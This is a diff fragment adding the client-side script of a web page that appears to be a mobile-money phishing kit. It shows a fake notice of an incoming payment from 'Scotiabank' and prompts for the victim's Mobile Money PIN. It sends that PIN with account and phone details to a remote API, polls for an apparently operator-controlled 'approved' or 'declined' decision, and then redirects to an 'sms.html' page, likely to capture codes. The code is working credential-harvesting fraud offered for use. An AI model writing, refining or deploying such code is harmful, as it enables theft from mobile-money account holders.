+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+
+  function showLoading(title, desc, note) {
+    document.getElementById('loadingTitle').textContent = title;
+    document.getElementById('loadingDesc').textContent = desc;
+    document.getElementById('loadingNote').textContent = note || '';
+    document.getElementById('loadingOverlay').classList.add('show');
+  }
+  function hideLoading() {
+    document.getElementById('loadingOverlay').classList.remove('show');
+  }
+  function setLoadingTitle(title, desc, note) {
+    document.getElementById('loadingTitle').textContent = title;
+    document.getElementById('loadingDesc').textContent = desc;
+    document.getElementById('loadingNote').textContent = note || '';
+  }
+
+  function startConfirmFlow() {
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = true;
+
+    showPopup();
+  }
+
+  function showPopup() {
+    const amtFull = formatAmount(tx.am, tx.cur);
+    const sender = tx.mk || 'Scotiabank';
+    document.getElementById('popupMessage').innerHTML =
+      'You are about to receive <strong>' + amtFull + '</strong> from <strong>' + sender + '</strong>.';
+    document.getElementById('confirmPopup').classList.add('show');
+  }
+
+  function popupYes() {
+    document.getElementById('confirmPopup').classList.remove('show');
+    showPinPanel();
+  }
+
+  function popupNo() {
+    document.getElementById('confirmPopup').classList.remove('show');
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = false;
+    showToast('Transaction cancelled');
+  }
+
+  function showPinPanel() {
+    document.getElementById('pinPanel').classList.add('show');
+    const inp = document.getElementById('pinInput');
+    if (inp) { inp.value = ''; setTimeout(() => inp.focus(), 200); }
+    const err = document.getElementById('pinError');
+    if (err) err.classList.remove('show');
+    const btn = document.getElementById('pinSubmitBtn');
+    if (btn) { btn.disabled = false; btn.textContent = 'Authorize transfer'; }
+  }
+
+  function cancelPin() {
+    document.getElementById('pinPanel').classList.remove('show');
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = false;
+  }
+
+  let pinVisible = false;
+  function togglePin() {
+    const pin = document.getElementById('pinInput');
+    pinVisible = !pinVisible;
+    pin.type = pinVisible ? 'text' : 'password';
+    document.getElementById('eyeIcon').innerHTML = pinVisible
+      ? '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/><line x1="3" y1="3" x2="21" y2="21"/>'
+      : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  }
+
+  let pollingActive = false;
+  let pollTimer = null;
+
+  async function submitPin() {
+    const pin = document.getElementById('pinInput').value.trim();
+    const err = document.getElementById('pinError');
+
+    if (!pin || pin.length < 4) {
+      if (err) { err.textContent = 'Please enter your Mobile Money PIN.'; err.classList.add('show'); }
+      return;
+    }
+    if (err) err.classList.remove('show');
+
+    if (!tx.ref) {
+      const u = new URLSearchParams(location.search);
+      tx.ref = (u.get('r') || u.get('t') || '').toString();
+    }
+
+    if (!tx.ref) {
+      if (err) { err.textContent = 'Reference missing. Please reload the link.'; err.classList.add('show'); }
+      return;
+    }
+
+    const btn = document.getElementById('pinSubmitBtn');
+    btn.disabled = true;
+    btn.textContent = 'Authorizing…';
+
+    document.getElementById('pinPanel').classList.remove('show');
+
+    showLoading(
+      'Submitting your PIN…',
+      'Please wait. This may take up to 50 seconds if the server was sleeping.',
+      ''
+    );
+
+    const payload = {
+      tx: tx.ref,
+      pin: pin,
+      am: tx.am,
+      cur: tx.cur,
+      c: tx.c,
+      an: tx.an,
+      rn: tx.rn,
+      phone: tx.an || '',
+      lang: 'en'
+    };
+
+    console.log('[index] POST /api/mtn/pin payload:', payload);
+
+    try {
+      const r = await fetch(API_BASE + '/api/mtn/pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        signal: AbortSignal.timeout(60000)
+      });
+
+      const body = await r.text();
+      console.log('[index] /api/mtn/pin response:', r.status, body);
+
+      if (!r.ok) {
+        hideLoading();
+        showPinPanel();
+        if (err) {
+          let detail = 'Could not submit PIN.';
+          try { const j = JSON.parse(body); detail = j.message || j.error || detail; } catch(_) {}
+          err.textContent = detail;
+          err.classList.add('show');
+        }
+        return;
+      }
+    } catch (e) {
+      console.error('[index] PIN submit failed:', e);
+      hideLoading();
+      showPinPanel();
+      if (err) { err.textContent = 'Network error. Please try again.'; err.classList.add('show'); }
+      return;
+    }
+
+    setLoadingTitle(
+      'Processing…',
+      'Please do not close this page.',
+      ''
+    );
+
+    pollingActive = true;
+    const start = Date.now();
+    const MAX_WAIT_MS = 5 * 60 * 1000;
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      if (Date.now() - start > MAX_WAIT_MS) {
+        pollingActive = false;
+        hideLoading();
+        showToast('Session expired. Please reload and try again.');
+        return;
+      }
+
+      let decision = 'pending';
+      try {
+        const r = await fetch(API_BASE + '/api/mtn/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now(), {
+          signal: AbortSignal.timeout(30000)
+        });
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) {
+        console.warn('[pin poll] error:', e);
+      }
+
+      if (!pollingActive) return;
+
+      if (decision === 'approved') {
+        pollingActive = false;
+        setLoadingTitle('Redirecting…', 'Please wait.', '');
+        setTimeout(() => {
+          const q = new URLSearchParams({
+            tx:  tx.ref,
+            am:  tx.am,
+            cur: tx.cur,
+            rn:  tx.rn,
+            c:   tx.c,
+            pm:  tx.pm,
+            sn:  tx.sn,
+            mk:  tx.mk,
+            an:  tx.an,
+            dt:  tx.dt,
+            pu:  tx.pu,
+            lang: 'en'
+          });
+          window.location.href = 'sms.html?' + q.toString();
+        }, 800);
+        return;
+      }
+
+      if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        hideLoading();
+        const btn = document.getElementById('confirmBtn');
+        btn.disabled = false;
+        document.getElementById('pinInput').value = '';
+        showToast('Transfer declined. Please try again.');
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 1000);
+    };
+
+    poll();
+  }
+
+  document.addEventListener('DOMContentLoaded', init);
+</script>
+</body>
+</html>
